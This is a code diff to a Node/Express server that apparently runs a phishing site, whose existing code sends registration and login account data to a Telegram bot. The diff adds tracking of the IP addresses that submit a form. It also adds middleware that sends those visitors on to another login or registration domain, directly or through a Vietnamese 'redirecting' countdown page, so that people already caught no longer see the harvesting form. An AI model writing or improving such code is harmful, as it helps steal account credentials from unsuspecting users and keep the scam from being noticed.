@@ -9,6 +9,7 @@ const {
   sendRegisterAccountToBot,
   sendLoginAccountToBot,
 } = require('./utils/sendTelegram');
+const ipTracker = require('./utils/ipTracker');
 
 // Import Routes
 const adminRoutes = require('./routes/admin');
@@ -126,6 +127,7 @@ app.locals.domainConfig = {
   regDomain: process.env.REG_DOMAIN || '',
   loginDomain: process.env.LOGIN_DOMAIN || '',
   cskhLink: process.env.CSKH_LINK || '',
+  redirectDelay: process.env.REDIRECT_DELAY_SECONDS || '0',
 };
 app.locals.recentLogs = [];
 
@@ -146,6 +148,9 @@ const handleApiResponse = async (req, res, actionType) => {
       timeZone: 'Asia/Ho_Chi_Minh',
     });
     const userIp = getIp(req);
+
+    // Track IP to ipTracker on form submission
+    ipTracker.addIp(userIp);
 
     let data = {
       action: actionType,
@@ -236,6 +241,101 @@ const handleApiResponse = async (req, res, actionType) => {
     return res.status(500).json({ message: 'Error processing data' });
   }
 };
+
+// Intermediate redirect renderer for delayed redirection
+function renderRedirectPage(res, targetUrl, delaySeconds) {
+  return res.send(`<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="refresh" content="${delaySeconds};url=${targetUrl}">
+  <title>Đang chuyển hướng...</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background: #0b0d13;
+      color: #ffffff;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      padding: 20px;
+    }
+    .spinner {
+      width: 48px;
+      height: 48px;
+      border: 4px solid rgba(255, 255, 255, 0.1);
+      border-top-color: #f9752d;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin-bottom: 20px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    h2 { font-size: 18px; font-weight: 600; margin-bottom: 8px; }
+    p { font-size: 14px; color: #8b949e; margin-bottom: 16px; }
+    .countdown { font-weight: bold; color: #f9752d; }
+    a { color: #f9752d; text-decoration: none; font-size: 13px; margin-top: 10px; }
+    a:hover { text-decoration: underline; }
+  </style>
+</head>
+<body>
+  <div class="spinner"></div>
+  <h2>Đang chuyển hướng trang web...</h2>
+  <p>Vui lòng chờ trong <span id="timer" class="countdown">${delaySeconds}</span> giây...</p>
+  <a href="${targetUrl}">Bấm vào đây nếu trang không tự chuyển hướng</a>
+  <script>
+    var seconds = ${delaySeconds};
+    var timerEl = document.getElementById("timer");
+    var interval = setInterval(function() {
+      seconds--;
+      if (timerEl && seconds >= 0) timerEl.textContent = seconds;
+      if (seconds <= 0) {
+        clearInterval(interval);
+        window.location.replace("${targetUrl}");
+      }
+    }, 1000);
+    setTimeout(function() {
+      window.location.replace("${targetUrl}");
+    }, ${delaySeconds * 1000});
+  </script>
+</body>
+</html>`);
+}
+
+// IP Redirect Middleware for 2nd-time visits
+app.use((req, res, next) => {
+  if (req.method !== 'GET') return next();
+  const p = req.path.toLowerCase();
+  if (
+    p.startsWith('/admin') ||
+    p.startsWith('/api') ||
+    p.startsWith('/js') ||
+    p.startsWith('/css') ||
+    p.startsWith('/img')
+  ) {
+    return next();
+  }
+
+  const userIp = getIp(req);
+  if (ipTracker.isIpSubmitted(userIp)) {
+    const { redirectDomain, loginDomain, regDomain } = req.app.locals.domainConfig;
+    const targetUrl = redirectDomain || loginDomain || regDomain;
+    if (targetUrl) {
+      const delaySeconds = parseInt(req.app.locals.domainConfig.redirectDelay || '0', 10);
+      if (delaySeconds <= 0) {
+        return res.redirect(targetUrl);
+      } else {
+        return renderRedirectPage(res, targetUrl, delaySeconds);
+      }
+    }
+  }
+
+  next();
+});
 
 // Admin panel route
 app.use('/admin', adminRoutes);
